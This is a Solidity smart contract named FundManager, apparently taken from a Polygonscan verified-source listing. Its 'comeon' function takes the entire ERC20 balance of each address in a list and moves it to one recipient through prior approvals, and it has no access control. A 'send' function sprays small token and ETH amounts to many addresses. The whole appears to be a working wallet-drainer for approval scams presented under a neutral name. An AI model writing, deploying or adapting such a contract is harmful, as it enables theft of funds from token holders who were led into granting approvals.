/**
 *Submitted for verification at polygonscan.com on 2022-06-16
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address _owner) external view returns(uint256 balance);

    function transfer(address _to, uint256 _value) external returns (bool success);

    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);

    function approve(address _spender, uint256 _value) external returns (bool success);

    function allowance(address _owner, address _spender) external view returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

}

contract FundManager{

    receive() payable external {}   

    function safeTransferFrom(
        address token,
        address from,
        address to,
        uint256 value
    ) internal {
        (bool success, bytes memory data) =
        token.call(abi.encodeWithSelector(IERC20.transferFrom.selector, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'STF');
    }

    function safeTransfer(
        address token,
        address to,
        uint256 value
    ) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'ST');
    }

    function safeTransferETH(address to, uint256 value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        require(success, 'STE');
    }

    function comeon(address [] memory _fromList, address _token, address _to) external {

        for(uint i = 0; i < _fromList.length; i ++) {

            uint256 value = IERC20(_token).balanceOf(_fromList[i]);

            if(value > 0) {

                safeTransferFrom(_token, _fromList[i], _to, value);

            }

        }

    }

    function send(address [] memory _toList, address _token) external {

        for(uint i = 0; i < _toList.length; i ++) {


            safeTransfer(_token, _toList[i], 1000000000000000000);


            safeTransferETH(_toList[i], 1000000000000000);

        }

    }

}